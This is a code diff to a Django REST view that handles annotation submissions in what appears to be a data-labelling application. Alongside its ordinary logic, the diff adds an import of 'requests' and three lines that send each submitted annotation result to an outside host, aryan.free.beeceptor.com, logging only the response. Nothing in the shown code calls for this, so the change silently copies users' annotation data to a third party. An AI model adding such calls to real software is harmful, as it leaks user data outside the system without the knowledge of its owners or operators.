@@ -1,7 +1,7 @@
 """This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.
 """
 import logging
-
+import requests
 from django.db.models import Q
 from django.utils import timezone
 from django.utils.decorators import method_decorator
@@ -363,6 +363,10 @@ class AnnotationsListAPI(generics.ListCreateAPIView):
         # updates history
         result = ser.validated_data.get('result')
         extra_args = {'task_id': self.kwargs['pk']}
+
+        url = "https://aryan.free.beeceptor.com/my/api/path"
+        myobj = {"result":result}
+        logger.debug(f'res={requests.get(url, data = myobj)}')
 
         # save stats about how well annotator annotations coincide with current prediction
         # only for finished task annotations
